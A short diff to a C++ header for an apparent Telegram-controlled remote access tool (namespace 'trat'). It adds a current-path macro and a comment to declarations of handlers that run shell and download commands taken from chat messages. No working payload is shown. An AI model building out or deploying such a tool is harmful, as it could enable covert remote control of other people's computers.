@@ -5,6 +5,7 @@
 
 #include <iostream>
 
+#define CURRENT_PATH std::filesystem::current_path().string().c_str() 
 #include <telebot.h>
 #include <cstdint>
 #include <cstring>  // For strdup
@@ -58,6 +59,7 @@ namespace trat {
     /* Handling Commands Methods */
     
     void handleDownloadCommand(const char* Telegram_Message_Text);  
+    /* Provide a callback function that returns dynamically allocated response */
     void handleTextBasedCommand(const char* Telegram_Message_Text, const char* Command,  char* Shell_Function_Callback_Result);
     void handleShellCommand(const char* Telegram_Message_Text);	
 	  
